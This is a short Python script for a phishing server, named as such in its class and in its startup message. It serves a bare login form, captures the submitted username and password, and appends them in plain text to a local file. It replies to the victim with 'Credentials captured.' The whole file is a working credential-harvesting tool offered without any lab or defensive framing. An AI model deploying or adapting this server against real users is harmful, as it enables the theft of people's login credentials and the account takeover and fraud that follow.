from http.server import BaseHTTPRequestHandler, HTTPServer
import os

class PhishingServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = """<html><body>
        <form action="/submit" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Log In">
        </form>
        </body></html>"""
        self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            username = post_data.split("username=")[1].split("&")[0]
            password = post_data.split("password=")[1]
            with open("credentials.txt", "a") as f:
                f.write(f"{username}:{password}\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Success! Credentials captured.")
        else:
            self.send_response(404)
            self.end_headers()

def run_server():
    server_address = ("", 8000)
    httpd = HTTPServer(server_address, PhishingServer)
    print("Phishing server running on port 8000...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()